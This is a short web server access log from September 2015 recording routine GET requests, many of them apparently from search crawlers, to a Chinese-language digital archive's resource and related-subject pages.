123.51.219.125 - - [18/Sep/2015:14:39:18 +0800] "GET /content/subject/resource_content.jsp?oid=16797241&queryType=qc HTTP/1.1" 200 44202
61.135.189.170 - - [18/Sep/2015:14:39:19 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1609825 HTTP/1.1" 404 14873
123.51.219.125 - - [18/Sep/2015:14:39:19 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=16797241 HTTP/1.1" 200 1405
61.135.189.170 - - [18/Sep/2015:14:39:32 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=727070 HTTP/1.1" 404 14873
66.249.71.205 - - [18/Sep/2015:14:39:44 +0800] "GET /content/repository/resource_content.jsp?oid=1525731&queryString=%E5%BE%A9%E8%88%88%E8%88%AA%E7%A9%BA%20%E6%9E%97%E6%B0%B8%E6%A8%91 HTTP/1.1" 200 29279
61.135.189.170 - - [18/Sep/2015:14:39:47 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1599682 HTTP/1.1" 404 14873
66.249.71.249 - - [18/Sep/2015:14:39:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777254&queryString= HTTP/1.1" 200 34767
61.135.189.170 - - [18/Sep/2015:14:40:02 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1599489 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:40:15 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1617826 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:40:29 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1599505 HTTP/1.1" 404 14873
220.133.45.43 - - [18/Sep/2015:14:40:30 +0800] "GET /content/subject/resource_content.jsp?oid=16797287&queryString HTTP/1.1" 200 88698
61.135.189.170 - - [18/Sep/2015:14:40:42 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3130196 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:40:59 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1610494 HTTP/1.1" 404 14873
66.249.71.229 - - [18/Sep/2015:14:41:03 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%9D%8F%E8%91%89+%E6%9D%8F%E8%91%89%E7%9F%B3%E6%AB%9F+%E6%A4%8D%E7%89%A9%E7%95%8C+%E6%AB%9F%E5%B1%AC+%E6%AE%BC%E6%96%97%E7%A7%91+%E7%9F%B3%E6%AB%9F+%E7%9F%B3%E6%AB%9F%E5%B1%AC+&oid=2150779 HTTP/1.1" 200 3596
66.249.71.249 - - [18/Sep/2015:14:41:06 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%9D%8F%E8%91%89%20%E6%9D%8F%E8%91%89%E7%9F%B3%E6%AB%9F%20%E6%A4%8D%E7%89%A9%E7%95%8C%20%E6%AB%9F%E5%B1%AC%20%E6%AE%BC%E6%96%97%E7%A7%91%20%E7%9F%B3%E6%AB%9F%20%E7%9F%B3%E6%AB%9F%E5%B1%AC%20&oid=2150779 HTTP/1.1" 200 3596
61.135.189.170 - - [18/Sep/2015:14:41:13 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1601129 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:41:28 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1597375 HTTP/1.1" 404 14873
114.34.115.151 - - [18/Sep/2015:14:41:41 +0800] "GET /content/repository/resource_content.jsp?oid=1104938 HTTP/1.1" 200 31363
114.34.115.151 - - [18/Sep/2015:14:41:42 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%A4%8D%E7%89%A9%E7%95%8C+%E8%8F%8A%E7%A7%91+%E9%87%8E%E6%A1%90+%E9%87%8E%E6%A1%90%E8%92%BF+%E9%9B%99%E5%AD%90%E8%91%89+%E9%9B%99%E5%AD%90%E8%91%89%E6%A4%8D%E7%89%A9+%E9%A3%9B%E8%93%AC+%E9%A3%9B%E8%93%AC%E5%B1%AC+&oid=1104938 HTTP/1.1" 200 3467
220.133.45.43 - - [18/Sep/2015:14:41:45 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E7%81%A3%E5%8E%9F%E4%BD%8F%E6%B0%91+&oid=16797287 HTTP/1.1" 200 4742
61.135.189.170 - - [18/Sep/2015:14:41:45 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1610497 HTTP/1.1" 404 14873
163.20.242.176 - - [18/Sep/2015:14:42:00 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E7%81%A3%E6%AC%92%E6%A8%B9+%E6%AC%92%E6%A8%B9+%E8%8B%A6%E8%8B%93+%E8%8B%A6%E8%8B%93%E8%88%85+&oid=16777254 HTTP/1.1" 200 4383
61.135.189.170 - - [18/Sep/2015:14:42:04 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1616141 HTTP/1.1" 404 14873
66.249.71.225 - - [18/Sep/2015:14:42:12 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%BE%BD%E5%86%A0%20%E9%A0%AD%E7%9B%AE%E5%B8%BD%20&oid=1780653 HTTP/1.1" 200 3028
61.135.189.170 - - [18/Sep/2015:14:42:18 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1616671 HTTP/1.1" 404 14873
